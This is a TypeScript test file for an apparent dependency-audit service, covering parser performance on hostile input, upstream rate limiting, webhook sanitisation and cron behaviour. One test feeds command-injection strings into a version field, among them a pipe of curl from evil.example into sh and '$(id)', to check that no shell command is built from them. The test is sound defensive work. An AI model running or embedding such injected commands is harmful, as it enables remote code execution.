import { afterEach, describe, expect, it } from "vitest";
import { accessFor } from "../src/billing.js";
import { GITHUB_MALWARE_PER_CALL } from "../src/config.js";
import { lookupPackages } from "../src/lookup.js";
import { parseManifest } from "../src/manifest/parse.js";
import { auditManifest, commandsFor } from "../src/operations.js";
import { verifiedReleaseNotes } from "../src/release-notes.js";
import { getStore, resetStoreForTests } from "../src/store.js";
import { cachedJson, resetUpstreamForTests, setFetchForTests } from "../src/upstream/http.js";
import { executeCron } from "../src/watch-job.js";
import { postWebhook, webhookKind } from "../src/webhooks.js";
import { installFakeUpstream } from "./fake-upstream.js";

afterEach(() => {
  resetStoreForTests();
  resetUpstreamForTests();
  delete process.env.CRON_SECRET;
});

function json(body: unknown, status = 200, headers: Record<string, string> = {}): Response {
  return new Response(JSON.stringify(body), { status, headers: { "content-type": "application/json", ...headers } });
}

function timed(run: () => unknown): number {
  const started = performance.now();
  run();
  return performance.now() - started;
}

describe("lockfile parsers on hostile input", () => {
  it("stays linear on unclosed XML comments and tags", () => {
    const size = 200_000;
    const inputs: [string, string][] = [
      ["pom.xml", "<!--".repeat(size / 4)],
      ["pom.xml", "<dependencies>".repeat(Math.floor(size / 14))],
      ["pom.xml", "<plugin>".repeat(size / 8)],
      ["a.csproj", "<PackageReference".repeat(Math.floor(size / 17))],
      ["a.csproj", "<PackageReference Include=\"x\">".repeat(Math.floor(size / 30))]
    ];
    for (const [file, content] of inputs) {
      expect(timed(() => parseManifest(file, content)), file).toBeLessThan(250);
    }
  });

  it("still reads normal pom.xml and .csproj files after the scanner change", () => {
    const pom = parseManifest("pom.xml", `<project><!-- <dependency><groupId>x</groupId></dependency> -->
      <build><plugins><plugin><dependencies><dependency><groupId>p</groupId><artifactId>q</artifactId><version>1</version></dependency></dependencies></plugin></plugins></build>
      <dependencies><dependency><groupId>org.slf4j</groupId><artifactId>slf4j-api</artifactId><version>2.0.9</version></dependency>
      <dependency><groupId>junit</groupId><artifactId>junit</artifactId><version>4.13.2</version><scope>test</scope></dependency></dependencies></project>`);
    expect(pom.dependencies.map((dep) => dep.name)).toEqual(["org.slf4j:slf4j-api", "junit:junit"]);
    const csproj = parseManifest("app.csproj", `<Project><ItemGroup>
      <PackageReference Include="Newtonsoft.Json" Version="13.0.3" />
      <PackageReference Include="Serilog"><Version>3.1.1</Version></PackageReference>
      <!-- <PackageReference Include="Hidden" Version="1.0.0" /> -->
    </ItemGroup></Project>`, false);
    expect(csproj.dependencies.map((dep) => `${dep.name}@${dep.version}`)).toEqual(["Newtonsoft.Json@13.0.3", "Serilog@3.1.1"]);
  });

  it("counts a repeated name and version in a lockfile once", () => {
    const yarn = "\"left-pad@^1.0.0\", \"left-pad@^1.3.0\":\n  version \"1.3.0\"\n\nleft-pad@~1.3.0:\n  version \"1.3.0\"\n";
    const parsed = parseManifest("yarn.lock", yarn);
    expect(parsed.dependencies).toHaveLength(1);
  });
});

describe("upstream cost controls", () => {
  it("opens the circuit when GitHub answers 403 with a spent rate limit", async () => {
    let hits = 0;
    setFetchForTests(async () => {
      hits += 1;
      return json({ message: "API rate limit exceeded" }, 403, { "x-ratelimit-remaining": "0", "x-ratelimit-reset": String(Math.floor(Date.now() / 1000) + 600) });
    });
    await expect(cachedJson({ source: "github", url: "https://api.github.com/advisories?a=1", ttlSeconds: 60 })).rejects.toThrow(/rate limiting/);
    await expect(cachedJson({ source: "github", url: "https://api.github.com/advisories?a=2", ttlSeconds: 60 })).rejects.toThrow(/rate limiting/);
    expect(hits).toBe(1);
  });

  it("shares one upstream request between identical calls in flight", async () => {
    let hits = 0;
    setFetchForTests(async () => {
      hits += 1;
      await new Promise((resolve) => setTimeout(resolve, 20));
      return json({ ok: true });
    });
    const url = "https://pypi.org/pypi/requests/json";
    await Promise.all([1, 2, 3, 4].map(() => cachedJson({ source: "pypi", url, ttlSeconds: 60 })));
    expect(hits).toBe(1);
  });

  it(`caps GitHub malware lookups at ${GITHUB_MALWARE_PER_CALL} names per call`, async () => {
    let github = 0;
    const names = Array.from({ length: GITHUB_MALWARE_PER_CALL + 10 }, (_, index) => `pkg-${index}`);
    setFetchForTests(async (url, init) => {
      const parsed = new URL(url);
      if (parsed.hostname === "api.github.com") {
        github += 1;
        return json([]);
      }
      if (parsed.hostname === "registry.npmjs.org") return json({ name: parsed.pathname.slice(1), "dist-tags": { latest: "1.0.0" }, versions: { "1.0.0": {} } });
      if (parsed.hostname === "api.deps.dev") return json({ versions: [{ versionKey: { version: "1.0.0" }, isDefault: true }] });
      if (parsed.hostname === "api.osv.dev") {
        const body = JSON.parse(String(init?.body ?? "{}")) as { queries?: unknown[] };
        return json({ results: (body.queries ?? []).map(() => ({ vulns: [] })) });
      }
      return new Response("no", { status: 404 });
    });
    const facts = await lookupPackages(names.map((name) => ({ ecosystem: "npm" as const, name, version: "1.0.0" })));
    expect(github).toBe(GITHUB_MALWARE_PER_CALL);
    expect(facts.at(-1)?.notes.join(" ")).toContain("GitHub malware check covers the first");
  });

  it("reports packages past the call deadline as not checked instead of running past the time limit", async () => {
    let hits = 0;
    setFetchForTests(async () => {
      hits += 1;
      return json({});
    });
    const facts = await lookupPackages([{ ecosystem: "npm", name: "left-pad", version: "1.3.0" }], { deadline: 0 });
    expect(hits).toBe(0);
    expect(facts[0].exists).toBeNull();
    expect(facts[0].advisories_known).toBe(false);
    expect(facts[0].notes.join(" ")).toContain("time limit");
  });

  it("finds the changelog from the repository listing without downloading it", async () => {
    const seen: string[] = [];
    setFetchForTests(async (url) => {
      seen.push(new URL(url).pathname);
      if (url.endsWith("/releases/tags/v2.0.0")) return json({ html_url: "https://github.com/acme/widget/releases/tag/v2.0.0" });
      if (url.endsWith("/contents")) return json([{ name: "README.md", type: "file", html_url: "https://github.com/acme/widget/blob/main/README.md" }, { name: "CHANGELOG.md", type: "file", html_url: "https://github.com/acme/widget/blob/main/CHANGELOG.md" }]);
      return new Response("no", { status: 404 });
    });
    const notes = await verifiedReleaseNotes("https://github.com/acme/widget", "2.0.0");
    expect(notes.links).toEqual(["https://github.com/acme/widget/releases/tag/v2.0.0", "https://github.com/acme/widget/blob/main/CHANGELOG.md"]);
    expect(seen.some((path) => path.endsWith("/contents/CHANGELOG.md"))).toBe(false);
  });
});

describe("audit size and commands", () => {
  it("refuses an oversized manifest before parsing and without counting a call", async () => {
    const account = await getStore().ensureAccount("12121212-1212-4121-8121-121212121212", "free@example.com");
    const access = await accessFor(account.id);
    expect(access.plan).toBe("trial");
    await getStore().setTrialStart(account.id, "2000-01-01T00:00:00.000Z");
    const free = await accessFor(account.id);
    expect(free.plan).toBe("free");
    const result = await auditManifest(free, { filename: "pom.xml", content: "<!--".repeat(6_000) });
    expect(result.isError).toBe(true);
    const usage = (getStore() as unknown as { usage: Map<string, unknown> }).usage;
    expect([...usage.keys()].filter((key) => key.startsWith(account.id))).toHaveLength(0);
  });

  it("does not put unexpected version text into a shell command", () => {
    expect(commandsFor("npm", "left-pad", "1.3.0")).toEqual(["npm install left-pad@1.3.0"]);
    expect(commandsFor("composer", "acme/widget", "1.0; curl evil.example | sh")[0]).toContain("No command is shown");
    expect(commandsFor("rubygems", "rack", "$(id)")[0]).toContain("No command is shown");
  });
});

describe("webhooks", () => {
  it("refuses custom ports and keeps mentions out of posts", async () => {
    expect(webhookKind("https://hooks.slack.com:8443/services/T/B/x")).toBeNull();
    expect(webhookKind("https://discord.com:444/api/webhooks/1/t")).toBeNull();
    const bodies: string[] = [];
    setFetchForTests(async (_url, init) => {
      bodies.push(String(init?.body ?? ""));
      return new Response(null, { status: 204 });
    });
    expect(await postWebhook("https://discord.com/api/webhooks/1/token", "@everyone/pkg@1.0.0 MAL-1")).toBe("ok");
    expect(JSON.parse(bodies[0]).allowed_mentions).toEqual({ parse: [] });
    expect(await postWebhook("https://hooks.slack.com/services/T/B/x", "label <!channel> & co")).toBe("ok");
    expect(JSON.parse(bodies[1]).text).toBe("label &lt;!channel&gt; &amp; co");
  });
});

describe("watch cron", () => {
  it("finishes when a watch timestamp cannot be saved instead of re-checking it in a loop", async () => {
    installFakeUpstream();
    const store = getStore();
    const account = await store.ensureAccount("13131313-1313-4131-8131-131313131313", "cron@example.com");
    for (let index = 0; index < 6; index += 1) {
      await store.saveWatch({
        account_id: account.id,
        label: `p-${index}`,
        filename: "package.json",
        ecosystem_summary: { npm: 1 },
        deps: [{ ecosystem: "npm", name: "express", version: "4.18.2" }],
        min_severity: "low",
        last_checked_at: "2000-01-01T00:00:00.000Z",
        baseline_complete: true,
        email: null,
        webhook_url: null,
        license_allow: [],
        license_deny: []
      });
    }
    const original = store.updateWatchMeta.bind(store);
    store.updateWatchMeta = async (accountId, label, meta) => {
      if (label === "p-0") throw new Error("write failed");
      return original(accountId, label, meta);
    };
    process.env.CRON_SECRET = "cron-test-secret";
    const started = Date.now();
    const result = await executeCron("Bearer cron-test-secret", undefined, "http://127.0.0.1");
    expect(Date.now() - started).toBeLessThan(5_000);
    expect(result.body.checked).toBe(6);
    expect(result.body.failed).toBe(1);
    expect(result.body.remaining).toBe(1);
  });
});
